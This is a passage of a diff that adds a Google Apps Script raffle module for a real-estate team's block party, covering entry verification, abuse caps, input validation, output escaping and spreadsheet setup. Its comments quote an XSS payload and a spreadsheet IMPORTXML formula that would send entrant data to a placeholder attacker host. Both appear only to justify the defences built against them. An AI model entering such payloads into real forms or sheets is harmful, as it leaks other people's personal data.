@@ -1,0 +1,3167 @@
+// RaffleCode.gs — TSG Block Party 2026 prize drawing (entry form + draw + FUB sync)
+//
+// Added 2026-09-16, per Durand. Lives in the "TSG Open House Sign-In + Client
+// Intake Forms" project ON PURPOSE rather than in a new standalone project:
+// this project is ALREADY the public, anonymous, no-login form host under
+// info@, it already holds FUB_API_KEY, and it already carries the hardening a
+// public endpoint needs (submit token, rate limit, honeypot, dedupe claims,
+// contact-enumeration protection, error alerts). A greenfield project would
+// have meant reimplementing all of that from scratch, untested, in three days
+// — strictly more risk, not less. Nothing here touches the task-tracker script
+// or its Anthropic key / script token.
+//
+// This file is ADDITIVE. It defines only raffle* symbols and reads a handful of
+// existing helpers out of Code.gs's shared global scope (checkSubmitToken and
+// checkRateLimit have already run in doPost before anything here is reached).
+// The only edits to Code.gs are the two one-line route hooks in PATCH-Code.gs.md.
+//
+// Storage is a Google Sheet, not FUB: an entry is a contest record and has to
+// survive a FUB outage, a bad API key, or a rate-limited CRM. The sheet row is
+// written FIRST and the FUB push is best-effort on top of it, with its outcome
+// recorded back on the row so raffleRetryFubFailures() can re-push later. An
+// entrant is never turned away because the CRM was down.
+
+// ---------- Event configuration ----------
+var RAFFLE_EVENT_NAME   = 'TSG Block Party 2026';
+var RAFFLE_TZ           = 'America/New_York';
+// 2026-09-17, per Durand: the entry window is OPEN FROM NOW, not just during the
+// party. The original design only accepted entries between 3:00 and 6:15 on the
+// day, which made sense when entering was a 20-second sign-in at a table. It
+// stopped making sense once a referral entered the picture: chasing somebody
+// else's inbox is not a three-hour job, and a window that tight would have
+// produced a 6:30 announcement with a near-empty pool. (A confirmed referral is
+// now a multiplier rather than a requirement, so a third party's inbox is no
+// longer on the critical path at all -- but the reasons to open early stand.)
+//
+// Opening it early is also what makes the pre-event email to invited clients
+// work -- people arrive already entered, and referrals have days rather than
+// hours to confirm.
+//
+// The CLOSE is still hard and still server-side: entries stop at 6:15 because
+// that is when the winner is drawn. Anything else would mean drawing from a pool
+// that is still changing.
+var RAFFLE_OPEN_AT      = '2026-09-01T00:00:00-04:00';
+// The party itself. Until 2026-09-17 every date on the page was derived from
+// RAFFLE_OPEN_AT, which was fine while "entries open" and "the party starts"
+// were the same instant. They are not any more, so the event has its own
+// constant and the page reads the event date from here. Change the party date in
+// ONE place and every line on the form follows.
+var RAFFLE_EVENT_AT     = '2026-09-19T15:00:00-04:00';
+var RAFFLE_EVENT_ENDS   = '7:00 PM';
+var RAFFLE_VENUE        = '1342 N Hancock St, Philadelphia';
+var RAFFLE_CLOSE_AT     = '2026-09-19T18:15:00-04:00';
+var RAFFLE_DRAW_AT      = '2026-09-19T18:15:00-04:00';
+var RAFFLE_ANNOUNCE_AT  = '6:30 PM';
+var RAFFLE_PRIZE_SHORT  = '$300 toward any Ticketmaster purchase';
+var RAFFLE_PRIZE_ARV    = '$300.00';
+
+// Ryan's calendar identity is ryan@thestawaszgroup.com; this project's agent
+// roster has him as ryan@tsg.homes. Both are mailed rather than guessing which
+// one he actually reads on a Saturday evening — see README "Open items".
+var RAFFLE_RESULT_EMAIL = 'durand@thestawaszgroup.com,ryan@thestawaszgroup.com,ryan@tsg.homes';
+
+// ---------- Entry weighting ----------
+// 2026-09-17, per Durand, BEFORE anybody had entered. Entry used to REQUIRE a
+// confirmed referral, and that put a third party's inbox on the critical path of
+// the raffle existing at all: a cold referral confirming by email inside a few
+// days converts somewhere around 20-40% even with a nudge, so a handful of
+// referrals could realistically produce ZERO eligible entries and no drawing.
+// That failure mode is far worse than a thin pool.
+//
+// So a referral is now a MULTIPLIER, not a gate:
+//   * verifying your email enters you once, immediately;
+//   * every referral who confirms adds RAFFLE_BONUS_TICKETS_PER_REFERRAL more.
+//
+// Referring is still worth six times as much as not, so the incentive is intact,
+// but the drawing cannot fail to have entrants. Changed while the rules bound
+// nobody -- doing this after entries started would have meant judging people
+// under different rules than they entered under.
+var RAFFLE_BONUS_TICKETS_PER_REFERRAL = 5;
+
+var RAFFLE_SOURCE = 'TSG Block Party 2026 - Raffle';
+
+// ---------- The web app's own URL ----------
+// Every link this project puts in an email (consent, chain, rules, the console
+// link in the 6:15 result) was built from ScriptApp.getService().getUrl(). That
+// returns whatever URL the CURRENT execution came in on: the /exec a visitor
+// used, the /dev URL when run from the editor (raffleAdminLinks printed /dev
+// links on 2026-09-17), and, from a time-driven trigger, nothing anyone should
+// rely on. The 5:00 reminder and the 6:15 result are both triggers. So the
+// plain public /exec URL is remembered in a script property -- recorded the
+// first time the public page is served on it, or set by hand -- and preferred
+// everywhere; getUrl() is only the fallback.
+var RAFFLE_EXEC_URL_PROP = 'RAFFLE_EXEC_URL';
+var RAFFLE_EXEC_URL_RE = /^https:\/\/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]+\/exec$/;
+// A signed-in Workspace visitor is redirected to a domain-scoped form of the
+// same URL (/a/macros/<domain>/s/<id>/exec, or the older /a/<domain>/macros/...).
+// Durand opened the public link on 2026-09-17 and landed on exactly that, so
+// nothing was recorded. Both forms carry the same deployment id: strip the
+// domain and keep the plain URL, which is the one that works for everyone.
+var RAFFLE_EXEC_URL_SCOPED_RE =
+  /^https:\/\/script\.google\.com\/(?:a\/macros\/[^\/]+|a\/[^\/]+\/macros)\/s\/([A-Za-z0-9_-]+)\/exec$/;
+
+function raffleNormalizeExecUrl_(url) {
+  var u = String(url || '').split('?')[0].split('#')[0];
+  if (RAFFLE_EXEC_URL_RE.test(u)) return u;
+  var m = u.match(RAFFLE_EXEC_URL_SCOPED_RE);
+  return m ? 'https://script.google.com/macros/s/' + m[1] + '/exec' : '';
+}
+
+function raffleBaseUrl_() {
+  var stored = '';
+  try { stored = PropertiesService.getScriptProperties().getProperty(RAFFLE_EXEC_URL_PROP) || ''; }
+  catch (err) { stored = ''; }
+  if (RAFFLE_EXEC_URL_RE.test(stored)) return stored;
+  var live = '';
+  try { live = ScriptApp.getService().getUrl() || ''; } catch (err2) { live = ''; }
+  return live;
+}
+
+// Called with the URL a public GET actually arrived on. Only the plain /exec
+// form is worth keeping: /dev is editor-only, and the /a/<domain>/ form forces
+// a Workspace login on whoever clicks it.
+function raffleRememberExecUrl_(url) {
+  try {
+    url = raffleNormalizeExecUrl_(url);
+    if (!url) return false;
+    var props = PropertiesService.getScriptProperties();
+    if (props.getProperty(RAFFLE_EXEC_URL_PROP) === url) return false;
+    props.setProperty(RAFFLE_EXEC_URL_PROP, url);
+    Logger.log('Raffle: remembered the public web-app URL.');
+    return true;
+  } catch (err) { return false; }
+}
+var RAFFLE_TAGS   = ['Block Party 2026', 'Block Party Raffle Entrant', 'Event Lead'];
+
+// ---------- Test mode vs live ----------
+// Reuses this project's EXISTING QA test mode (see the QA_TEST_* block in
+// Code.gs) rather than inventing a second one: ?form=raffle&qatest=<QA_TEST_SECRET>
+// mints a token, the page carries it, and doPost resolves isQaTestMode_() before
+// either of the raffle hooks is reached. One test-mode concept for the whole
+// project.
+//
+// Test entries live in their OWN sheet tab and a test draw records its winner
+// under its OWN script property. That separation is structural, not a filter:
+// there is no code path by which a test entry can be drawn as the real winner,
+// and a test draw cannot consume the real draw's one-shot idempotency lock.
+//
+// !! ONE DELIBERATE DIFFERENCE FROM Code.gs's TEST MODE. That one is documented
+// as "a LABELLING and ROUTING change only; by construction it cannot relax a
+// check". The raffle's test mode DOES relax exactly one check: the entry window.
+// It has to -- entries are refused outside 3:00-6:15 PM on 19 Sep, so with the
+// window enforced there is no way to test the form before the party, which is
+// the entire point. Every other check still runs unchanged: form token, rate
+// limit, honeypot, required fields, consent, and one-entry-per-person. The
+// relaxation is logged loudly every time it happens.
+// ---------- Email verification ----------
+// Entry is two-step: details -> emailed 6-digit code -> entered. Nothing is
+// written to the sheet or to FUB until the code is confirmed, so a typo'd or
+// invented address never becomes a contact record.
+//
+// WHY EMAIL AND NOT SMS. The phone is the field TCPA actually cares about, so an
+// SMS code would be the stronger check. It is not reachable for this event:
+// Follow Up Boss's /v1/textMessages endpoint only LOGS an externally-sent text,
+// it cannot send one, and a real SMS provider needs US A2P 10DLC registration,
+// which is currently running 10-15 days for campaign review. The party is in
+// three days. The phone is therefore hard-validated (below) rather than
+// ownership-proven, and that limitation is stated plainly in the README.
+var RAFFLE_CODE_TTL_SECONDS = 900;      // 15 minutes to type a 6-digit code
+var RAFFLE_CODE_MAX_ATTEMPTS = 5;
+var RAFFLE_PENDING_PREFIX = 'raffle_pending_';
+// A verified session: proof, on later requests, that this visitor owns the email
+// address their entry will be attributed to. Written by raffleVerifyCode_ and
+// read by raffleSubmitReferral_. One hour is long enough to think of someone to
+// refer and type their details, and short enough that a phone left on a table at
+// the party is not a standing credential.
+var RAFFLE_VERIFIED_PREFIX = 'raffle_verified_';
+var RAFFLE_VERIFIED_TTL_SECONDS = 3600;
+
+// ---------- Verification-email abuse caps ----------
+// Step 1 emails a code to whatever address is posted, before anything is
+// verified. That is what verification IS, but it also makes this endpoint a
+// free mailer that anyone with the QR code can drive from a script. Two things
+// have to be bounded:
+//
+//   * one address being mailed over and over (harassment), and
+//   * the account's daily send quota (1,500 on Workspace). The shared
+//     checkRateLimit() caps 15 submissions/MINUTE across both public forms,
+//     which sounds tight but sustains 21,600/day -- the quota dies in under two
+//     hours, taking verification codes, the Open House form's emails and
+//     sendErrorAlert down with it, silently.
+//
+// So: at most 3 codes to one address per hour, and a hard ceiling on total
+// RECIPIENTS per 6-hour window (CacheService's maximum TTL). Recipients, not
+// messages: the quota is charged per address, and an invite carries two
+// oversight copies, so it costs three where a code costs one. The ceiling was
+// 500 messages when the invite had no copies; at three recipients each, 500
+// invites was the whole day's quota, which is the opposite of a guard. The
+// party is three hours with about 125 people expected -- a strong day is ~350
+// guarded recipients -- so 750 is about 2x the realistic peak and only bites
+// during an attack. The daily quota itself is protected by the reserve below.
+// Added 2026-09-16 after test/test_redteam.js (T3); weighted 2026-09-17.
+var RAFFLE_CODE_SEND_PREFIX = 'raffle_codes_';
+var RAFFLE_CODE_MAX_PER_ADDRESS = 3;
+var RAFFLE_CODE_ADDRESS_WINDOW_SECONDS = 3600;   // 1 hour
+var RAFFLE_CODE_GLOBAL_PREFIX = 'raffle_codes_all_';
+var RAFFLE_CODE_MAX_GLOBAL = 750;                // recipients per 6-hour bucket
+var RAFFLE_CODE_GLOBAL_WINDOW_SECONDS = 21600;   // 6 hours (cache maximum)
+// The ceiling can be raised from the draw console without a redeploy (Durand,
+// 2026-09-17: "a button for me to increase the quota just in case"). It is the
+// only limit that CAN be raised: Google's 1,500 a day is Google's. The override
+// is a script property, in steps of RAFFLE_CEILING_STEP, and never lowers it.
+var RAFFLE_CEILING_OVERRIDE_PROP = 'RAFFLE_CEILING_OVERRIDE';
+var RAFFLE_CEILING_STEP = 500;
+
+// ---------- Daily send-quota reserve ----------
+// The account's real limit is 1,500 recipients a day, shared with the Open
+// House form and every alert. Nothing above watches it: when it hits zero,
+// MailApp throws, the entrant sees "Something went wrong", and the alert that
+// would have said so cannot be sent either. So every guarded send first reads
+// the remaining quota and refuses once fewer than RAFFLE_MAIL_RESERVE would be
+// left -- enough for the 6:15 result, the winner email, the hourly digest and a
+// handful of alerts, which are the sends that matter more than one more code.
+// The refusal alerts once per 6-hour bucket, while it still can.
+var RAFFLE_MAIL_RESERVE = 40;
+var RAFFLE_MAIL_RESERVE_ALERT_PREFIX = 'raffle_mail_reserve_alert_';
+
+// ---------- Day-of run-out projection ----------
+// Between the doors opening and entries closing, every guarded send also records
+// the remaining quota. From those readings, raffleQuotaProjection_ works out the
+// burn rate -- the faster of "since the party started" and "the last hour", so a
+// late surge is caught -- and asks whether the quota lasts to 6:15 with the
+// reserve intact. If not, ONE email goes to RAFFLE_NOTIFY_EMAIL naming the
+// rate and the projected run-out time. The hourly digest takes a reading too,
+// so a quiet stretch still produces a datapoint, and prints the same numbers.
+var RAFFLE_QUOTA_READINGS_PROP = 'RAFFLE_QUOTA_READINGS';
+var RAFFLE_QUOTA_ALERT_PROP    = 'RAFFLE_QUOTA_ALERT_SENT_AT';
+var RAFFLE_QUOTA_RATE_MIN_MS   = 10 * 60000;   // need 10 minutes of readings before projecting
+var RAFFLE_QUOTA_RECENT_MS     = 60 * 60000;   // the "recent" rate window
+
+// Names. Durand, 2026-09-17, reading the QA suite's inbox: "some of the subject
+// lines don't look right" -- the hostile-input entrants ("<img src=x onerror=..>
+// QA Tester", "=IMPORTXML(...) QA") had produced invitation subjects reading
+// "<img src=x onerror=alert(1)> QA Tester referred you". Every sink escapes, so
+// nothing executed, but a name is interpolated into the SUBJECT of an email to a
+// third party, and a subject line has no escaping to hide behind. So a name is
+// letters (any script), digits, spaces, apostrophes, hyphens and periods, up to
+// 60 characters -- checked at the door for the entrant, the referral, and the
+// consent page's edited name. Sink escaping stays as defence in depth; the
+// suites relax this regex to keep proving it.
+var RAFFLE_NAME_MAX = 60;
+var RAFFLE_NAME_ALLOWED_RE = /^[\p{L}\p{M}\p{N}][\p{L}\p{M}\p{N} .'\u2019\-]*$/u;
+var RAFFLE_NAME_MESSAGE = 'Names can only use letters, spaces, apostrophes, hyphens and periods.';
+
+function raffleRejectJunkName_(name) {
+  var n = String(name || '');
+  if (n.length > RAFFLE_NAME_MAX) {
+    throw makeValidationError('That name is too long (' + RAFFLE_NAME_MAX + ' characters at most).');
+  }
+  if (!RAFFLE_NAME_ALLOWED_RE.test(n)) throw makeValidationError(RAFFLE_NAME_MESSAGE);
+  return n;
+}
+
+// Junk rejection, applied to BOTH steps. This is not politeness -- FUB already
+// carries "test@me.com / 1234567899" and "asdf@asdf.caf" from earlier form
+// testing, and a raffle at a party is exactly where that gets typed on purpose.
+var RAFFLE_DISPOSABLE_EMAIL_RE = new RegExp('@(?:' + [
+  'mailinator\\.com', 'guerrillamail\\.[a-z]+', '10minutemail\\.[a-z]+',
+  'tempmail\\.[a-z]+', 'temp-mail\\.[a-z]+', 'throwaway\\.[a-z]+',
+  'yopmail\\.[a-z]+', 'trashmail\\.[a-z]+', 'sharklasers\\.com',
+  'getnada\\.com', 'dispostable\\.com', 'maildrop\\.cc',
+  'fakeinbox\\.com', 'mailnesia\\.com', 'example\\.(?:com|org|net)',
+  'test\\.(?:com|org|net)'
+].join('|') + ')$', 'i');
+var RAFFLE_ROLE_LOCALPART_RE =
+  /^(?:test|tester|testing|asdf|qwerty|admin|administrator|root|postmaster|abuse|noreply|no-reply|donotreply|nobody|none|null|na|n\/a|fake|foo|bar|baz|xxx|aaa|sample|example)[0-9]*$/i;
+
+// Rejects a phone that cannot be a real North American number, plus the
+// keyboard-mash patterns people actually type.
+function raffleRejectJunkPhone_(phone) {
+  var d = String(phone || '').replace(/\D/g, '');
+  if (!d) throw makeValidationError('Enter your phone number.');
+  if (d.length === 11 && d.charAt(0) === '1') d = d.slice(1);
+  if (d.length !== 10) {
+    throw makeValidationError('Enter a 10-digit US phone number.');
+  }
+  if (/^(\d)\1{9}$/.test(d)) {
+    throw makeValidationError('That phone number does not look real. Please check it.');
+  }
+  if (d === '1234567890' || d === '0123456789' || d === '9876543210') {
+    throw makeValidationError('That phone number does not look real. Please check it.');
+  }
+  var area = d.slice(0, 3), exch = d.slice(3, 6);
+  // NANP: area and exchange codes never start 0 or 1, and N11 codes are service
+  // codes (411, 911...), never subscriber numbers.
+  if (area.charAt(0) === '0' || area.charAt(0) === '1' ||
+      exch.charAt(0) === '0' || exch.charAt(0) === '1' ||
+      /^\d11$/.test(area)) {
+    throw makeValidationError('That is not a valid US phone number. Please check it.');
+  }
+  // 555-01xx is the reserved fictional range.
+  if (exch === '555' && d.slice(6, 8) === '01') {
+    throw makeValidationError('That phone number does not look real. Please check it.');
+  }
+  return d;
+}
+
+function raffleRejectJunkEmail_(email) {
+  var e = String(email || '').trim().toLowerCase();
+  // Code.gs's validateEmailField returns early on an empty value (it is used
+  // where email is optional), so emptiness has to be caught here or a blank
+  // address would sail through and we would "send a code" to nobody.
+  if (!e) throw makeValidationError('Enter your email address.');
+  validateEmailField(e);                       // shared shape check from Code.gs
+  if (RAFFLE_DISPOSABLE_EMAIL_RE.test(e)) {
+    throw makeValidationError('Please use a real email address you can check right now — we send your entry code to it.');
+  }
+  var local = e.split('@')[0];
+  if (RAFFLE_ROLE_LOCALPART_RE.test(local)) {
+    throw makeValidationError('Please use your own email address.');
+  }
+  return e;
+}
+
+var RAFFLE_LIVE_SHEET_NAME  = 'Entries';
+var RAFFLE_TEST_SHEET_NAME  = 'Test Entries';
+var RAFFLE_TEST_WINNER_PROP = 'RAFFLE_TEST_WINNER_JSON';
+
+// Whoever runs setupRaffle() OWNS the entries sheet, and that is not
+// necessarily the account the web app runs as (executeAs: USER_DEPLOYING means
+// the deploying account). If those differ and the sheet is not shared, the web
+// app's SpreadsheetApp.openById throws and EVERY ENTRY ON THE DAY IS REFUSED.
+// So setup explicitly shares the sheet with both accounts rather than assuming
+// the right person happened to run it.
+var RAFFLE_SHEET_SHARE_WITH = ['info@tsg.homes', 'durand@thestawaszgroup.com'];
+
+var RAFFLE_SHEET_PROP   = 'RAFFLE_SHEET_ID';
+var RAFFLE_WINNER_PROP  = 'RAFFLE_WINNER_JSON';
+var RAFFLE_ADMIN_PROP   = 'RAFFLE_ADMIN_KEY';
+var RAFFLE_BACKUP_COUNT = 2;
+
+// Consent language version stamped onto every row. Bump this string if the
+// consent copy OR the Official Rules in RaffleForm.html change, so the audit
+// trail stays honest about which wording a given entrant actually saw. The
+// consent paragraph itself is unchanged in v3 -- rules sections 4, 5 and 7 are
+// what moved, and the checkbox binds the entrant to those too.
+var RAFFLE_CONSENT_VERSION = 'raffle-v3 (2026-09-17, 1 entry + bonus per confirmed referral)';
+
+// 2026-09-17, per Durand: a row is written when the entrant submits a referral,
+// but it is not worth its bonus yet -- 'Entry Status' is
+// 'pending-consent' until the referred person clicks the link in their email and
+// consents themselves. Only 'eligible' rows are drawn from.
+//
+// Columns are appended, never reordered or renamed: raffleEnsureHeaders_ widens
+// an existing sheet in place, so the tab Durand already has keeps its rows.
+var RAFFLE_SHEET_HEADERS = [
+  'Timestamp (ET)', 'Full Name', 'Email', 'Phone',
+  'Consent', 'Consent Version', 'Entry Source',
+  'FUB Status', 'FUB Person ID', 'Eligible', 'Email Verified',
+  // --- referral entry (added 2026-09-17) ---
+  'Entry Status',        // pending-consent | eligible | superseded | declined
+  'Referral Name', 'Referral Email', 'Referral Phone',
+  'Referral Role',       // Buyer | Seller
+  'Referral Timeframe',
+  'Referral FUB ID',
+  'Referral Consent At',
+  'Referral Emailed At',
+  'Consent Token',
+  // --- added 2026-09-17 (deferred FUB creation + the referral chain) ---
+  'Referral Logged At',   // when an unconsented referral was swept into FUB, flagged
+  'Chain Token',          // lets a consented referral enter by referring, without re-verifying
+  'Chain Emailed At',
+  'Reminder Sent At'      // the one last-chance nudge before the draw
+];
+
+// Column indexes, by name, resolved once. Reading by index literal is what makes
+// a schema change dangerous; this makes appending a column a one-line edit.
+var RAFFLE_COL = (function () {
+  var m = {};
+  RAFFLE_SHEET_HEADERS.forEach(function (h, i) { m[h] = i; });
+  return m;
+})();
+
+var RAFFLE_STATUS_PENDING    = 'pending-consent';
+var RAFFLE_STATUS_ELIGIBLE   = 'eligible';
+var RAFFLE_STATUS_SUPERSEDED = 'superseded';
+var RAFFLE_STATUS_DECLINED   = 'declined';
+
+// Widens an existing tab to the current header set, in place. Idempotent, and
+// safe on the tab that already holds live rows: it only ever ADDS columns to the
+// right of what is there, and only when the existing header row is a prefix of
+// the current one. Anything else (a renamed or reordered column) is refused
+// loudly rather than guessed at, because guessing would silently mis-map data.
+function raffleEnsureHeaders_(sh) {
+  var lastCol = sh.getLastColumn();
+  if (lastCol >= RAFFLE_SHEET_HEADERS.length) return;
+  if (lastCol > 0) {
+    var existing = sh.getRange(1, 1, 1, lastCol).getValues()[0]
+      .map(function (v) { return String(v || '').trim(); });
+    for (var i = 0; i < existing.length; i++) {
+      if (existing[i] && existing[i] !== RAFFLE_SHEET_HEADERS[i]) {
+        throw new Error('Raffle sheet "' + sh.getName() + '" column ' + (i + 1) + ' is "' +
+          existing[i] + '" but the code expects "' + RAFFLE_SHEET_HEADERS[i] + '". ' +
+          'Refusing to migrate a sheet whose columns have been reordered or renamed.');
+      }
+    }
+  }
+  var missing = RAFFLE_SHEET_HEADERS.slice(lastCol);
+  // A sheet narrower than the header list would make the setValues below throw.
+  // The default grid is 26 columns and the schema is 25, so this is only reached
+  // on a sheet somebody trimmed -- but a loud failure here would refuse an entry.
+  var maxCols = sh.getMaxColumns();
+  if (maxCols < RAFFLE_SHEET_HEADERS.length) {
+    sh.insertColumnsAfter(maxCols, RAFFLE_SHEET_HEADERS.length - maxCols);
+  }
+  sh.getRange(1, lastCol + 1, 1, missing.length).setValues([missing])
+    .setFontWeight('bold');
+  sh.setFrozenRows(1);
+  Logger.log('raffleEnsureHeaders_: added ' + missing.length + ' column(s) to "' +
+    sh.getName() + '": ' + missing.join(', '));
+}
+
+// ---------- Small helpers ----------
+function raffleNow_() { return new Date(); }
+
+// "1 people, 1 tickets" went to Ryan in a real rehearsal email on 2026-09-17.
+// Counts that can legitimately be one need a plural helper, not a bare + 's'.
+function rafflePlural_(n, one, many) {
+  var k = Number(n);
+  return k + ' ' + (k === 1 ? one : (many || (one + 's')));
+}
+
+function raffleFmt_(d) {
+  return Utilities.formatDate(d, RAFFLE_TZ, 'yyyy-MM-dd HH:mm:ss');
+}
+
+// ---------- Output encoding ----------
+// The host project deliberately stopped HTML-escaping submissions at INGEST
+// (Code.gs, audit fix M1: it was turning O'Brien into O&#39;Brien on the way
+// into FUB) and its comment says the right place to escape is wherever a value
+// is actually rendered as HTML. This module is the first caller that does:
+// raffleStatusPage_ and raffleDrawPage_ build HTML by concatenation from an
+// entrant's name, phone and email, all three of which came from a public text
+// box on a page anyone who scans the QR code can reach.
+//
+// Unescaped, "<img src=x onerror=...> Smith" is a stored XSS that fires in
+// Durand's browser the moment he opens the admin page to read the winner --
+// i.e. at 6:15 in front of the crowd. Found by test/test_redteam.js (T1),
+// 2026-09-16, before it ever ran live.
+//
+// Escape at the sink. Never re-add escaping at ingest: FUB, the Sheet and the
+// plain-text emails all want the real characters.
+function raffleEsc_(v) {
+  return String(v === null || v === undefined ? '' : v)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+// ---------- Spreadsheet write safety ----------
+// Sheets evaluates any cell whose text begins with = + - or @ as a FORMULA, so
+// an entrant who types =IMPORTXML("https://evil/?d="&C2,"//a") into the name box
+// gets that formula executed with Durand's session the moment he opens the
+// entries sheet -- and IMPORTXML/IMPORTDATA/HYPERLINK can quietly ship every
+// other entrant's name, email and phone to a third-party URL. The junk-phone
+// filter does not catch it: that reads digits, and a formula string can carry
+// ten perfectly valid ones.
+//
+// A leading apostrophe is Sheets' own "this is text" marker: it is not part of
+// the value, it is not displayed, and getValue() returns the string without it,
+// so dedupe keys and the FUB push are unaffected. Applied to every cell written
+// from entrant input. Found by test/test_redteam.js (T2), 2026-09-16.
+function raffleSafeCell_(v) {
+  var s = String(v === null || v === undefined ? '' : v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
+// Normalized identity keys. One entry per person is enforced on BOTH, because
+// the same person entering twice will usually vary one and not the other
+// (a nickname in the name field, gmail vs work email, phone typed two ways).
+// One entry per PERSON, and a person has one inbox even when they have many
+// spellings of it. gmail ignores dots entirely and every provider below ignores
+// a +tag suffix, so sam.vance@gmail.com, samvance@gmail.com and
+// sam.vance+party@gmail.com are one mailbox and must be one entry -- otherwise
+// the cheapest possible stuffing attack needs no second inbox and no second
+// phone. Dots are collapsed ONLY for Google-hosted consumer mail, because other
+// hosts do treat a dot as a distinct address.
+//
+// This is a KEY function only. The address actually mailed is always the one
+// the entrant typed.
+//
+// RESIDUAL GAP, accepted knowingly: Google Workspace and other custom domains
+// also honour +tags, and they cannot be enumerated here. The domain list is
+// deliberately conservative -- collapsing +tags everywhere would merge two
+// genuinely distinct people on the rare host that treats + as a literal
+// character, and would also break this project's own QA addresses
+// (durand+raffleqa...@thestawaszgroup.com), which depend on staying distinct.
+//
+// What actually bounds stuffing is not this function: every entry has to
+// RECEIVE a 6-digit code, so each extra entry costs a working inbox, and
+// raffleCheckCodeSendQuota_ caps how many codes any one address can pull. This
+// just removes the free case where one inbox yields unlimited spellings.
+var RAFFLE_PLUS_ALIAS_DOMAINS = ['gmail.com', 'googlemail.com', 'outlook.com',
+  'hotmail.com', 'live.com', 'yahoo.com', 'icloud.com', 'me.com', 'proton.me',
+  'protonmail.com', 'fastmail.com'];
+var RAFFLE_DOT_ALIAS_DOMAINS = ['gmail.com', 'googlemail.com'];
+
+function raffleEmailKey_(email) {
+  var v = String(email || '').trim().toLowerCase();
+  var at = v.lastIndexOf('@');
+  if (at < 1) return v;
+  var local = v.slice(0, at), domain = v.slice(at + 1);
+  if (domain === 'googlemail.com') domain = 'gmail.com';
+  if (RAFFLE_PLUS_ALIAS_DOMAINS.indexOf(domain) !== -1) {
+    var plus = local.indexOf('+');
+    if (plus > 0) local = local.slice(0, plus);
+  }
+  if (RAFFLE_DOT_ALIAS_DOMAINS.indexOf(domain) !== -1) {
+    local = local.replace(/\./g, '');
+  }
+  return local + '@' + domain;
+}
+
+function rafflePhoneKey_(phone) {
+  var digits = String(phone || '').replace(/\D/g, '');
+  // Strip a leading US country code so 2155551212 and 12155551212 collide.
+  if (digits.length === 11 && digits.charAt(0) === '1') digits = digits.slice(1);
+  return digits;
+}
+
+// The live tab and the test tab are different sheets in the same spreadsheet,
+// so Durand can see both side by side. The test tab is created on first use, so
+// an existing setup does not need setupRaffle() re-run to gain one.
+function raffleSheet_(test) {
+  var id = PropertiesService.getScriptProperties().getProperty(RAFFLE_SHEET_PROP);
+  if (!id) throw new Error(RAFFLE_SHEET_PROP + ' is not set. Run setupRaffle() once from the editor.');
+  var ss = SpreadsheetApp.openById(id);
+  if (!test) {
+    var live = ss.getSheetByName(RAFFLE_LIVE_SHEET_NAME) || ss.getSheets()[0];
+    raffleEnsureHeaders_(live);
+    return live;
+  }
+  var sh = ss.getSheetByName(RAFFLE_TEST_SHEET_NAME);
+  if (!sh) {
+    sh = ss.insertSheet(RAFFLE_TEST_SHEET_NAME);
+    sh.appendRow(RAFFLE_SHEET_HEADERS);
+    sh.setFrozenRows(1);
+    sh.getRange(1, 1, 1, RAFFLE_SHEET_HEADERS.length).setFontWeight('bold').setBackground('#fde2e1');
+  }
+  raffleEnsureHeaders_(sh);
+  return sh;
+}
+
+function raffleWinnerProp_(test) {
+  return test ? RAFFLE_TEST_WINNER_PROP : RAFFLE_WINNER_PROP;
+}
+
+// ---------- One-time setup ----------
+// Run this ONCE from the Apps Script editor (Durand, as info@). It is
+// idempotent: re-running reuses the existing sheet and re-points the trigger
+// rather than creating duplicates.
+function setupRaffle() {
+  var props = PropertiesService.getScriptProperties();
+  var out = [];
+
+  var sheetId = props.getProperty(RAFFLE_SHEET_PROP);
+  if (!sheetId) {
+    var ss = SpreadsheetApp.create('TSG Block Party 2026 — Raffle Entries');
+    var sh = ss.getSheets()[0];
+    sh.setName('Entries');
+    sh.appendRow(RAFFLE_SHEET_HEADERS);
+    sh.setFrozenRows(1);
+    sh.getRange(1, 1, 1, RAFFLE_SHEET_HEADERS.length).setFontWeight('bold');
+    props.setProperty(RAFFLE_SHEET_PROP, ss.getId());
+    sheetId = ss.getId();
+    out.push('Created entries sheet: ' + ss.getUrl());
+  } else {
+    out.push('Entries sheet already exists: https://docs.google.com/spreadsheets/d/' + sheetId);
+  }
+
+  // Bring the schema up to date HERE, not on the first visitor's request.
+  // raffleSheet_ calls raffleEnsureHeaders_ on every access, so an old sheet
+  // would migrate itself the moment somebody entered -- but that leaves the tab
+  // looking like it is missing the referral columns until then, and it puts a
+  // schema change on the critical path of a real entry. setupRaffle is the
+  // function whose job is to leave this ready, so it should do it and report it.
+  try {
+    // The width has to be read WITHOUT raffleSheet_, which migrates on the way
+    // out: measuring through it reported "up to date" in the very call that
+    // added fourteen columns, because the widening had already happened by the
+    // time getLastColumn was asked. (Shipped 2026-09-17, caught the same hour
+    // by Durand's run: the log showed the columns being added and the summary
+    // said nothing had changed.)
+    var ssSchema = SpreadsheetApp.openById(sheetId);
+    var liveTab = ssSchema.getSheetByName(RAFFLE_LIVE_SHEET_NAME) || ssSchema.getSheets()[0];
+    var beforeCols = liveTab.getLastColumn();
+    raffleSheet_(false);
+    raffleSheet_(true);                                  // creates + migrates the test tab too
+    var afterCols = liveTab.getLastColumn();
+    out.push(afterCols > beforeCols
+      ? 'Schema migrated: ' + beforeCols + ' -> ' + afterCols + ' columns on both tabs.'
+      : 'Schema up to date (' + afterCols + ' columns).');
+  } catch (schemaErr) {
+    out.push('WARNING: could not bring the entries sheet schema up to date: ' + schemaErr +
+             '  <-- fix this before Saturday, or entries may be refused');
+  }
+
+  // Share it, every run, whether the sheet is new or not -- this is also the
+  // repair path if setup was first run by the wrong account.
+  try {
+    var ssShare = SpreadsheetApp.openById(sheetId);
+    var owner = '';
+    try { owner = (ssShare.getOwner() && ssShare.getOwner().getEmail()) || ''; } catch (ownErr) { owner = ''; }
+    out.push('Entries sheet owner: ' + (owner || '(unknown)'));
+    RAFFLE_SHEET_SHARE_WITH.forEach(function (who) {
+      if (owner && who.toLowerCase() === owner.toLowerCase()) return;   // owner already has it
+      try {
+        ssShare.addEditor(who);
+        out.push('  shared with ' + who);
+      } catch (shareErr) {
+        out.push('  COULD NOT share with ' + who + ': ' + shareErr +
+                 '  <-- fix by hand, or entries may be refused on the day');
+      }
+    });
+  } catch (openErr) {
